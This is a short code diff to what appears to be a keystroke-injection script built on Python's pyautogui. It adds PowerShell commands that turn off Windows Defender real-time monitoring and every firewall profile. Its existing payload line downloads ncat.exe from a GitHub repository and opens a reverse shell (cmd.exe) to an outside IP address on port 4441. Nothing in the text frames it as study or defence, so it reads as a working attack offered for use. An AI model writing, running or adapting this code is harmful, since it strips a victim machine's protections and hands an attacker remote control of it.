@@ -36,6 +36,8 @@ pyautogui.hotkey('alt', 'f4')  # Close the defender window
 
 
 
+#turn off firewall and defender 
+
 
 
 
@@ -52,6 +54,18 @@ time.sleep(0.5)
 pyautogui.write('powershell', interval=0.05)
 pyautogui.press('enter')
 time.sleep(1)
+
+
+# Step 3: Disable Windows Defender
+pyautogui.write('Set-MpPreference -DisableRealtimeMonitoring $true', interval=0.01)
+pyautogui.press('enter')
+time.sleep(1)   
+
+# Step 3: Disable Windows Firewall
+pyautogui.write('Set-NetFirewallProfile -All -Enabled False', interval=0.01)
+pyautogui.press('enter')
+time.sleep(1)
+
 
 # Step 4: Type the payload
 payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4441 -e cmd.exe'
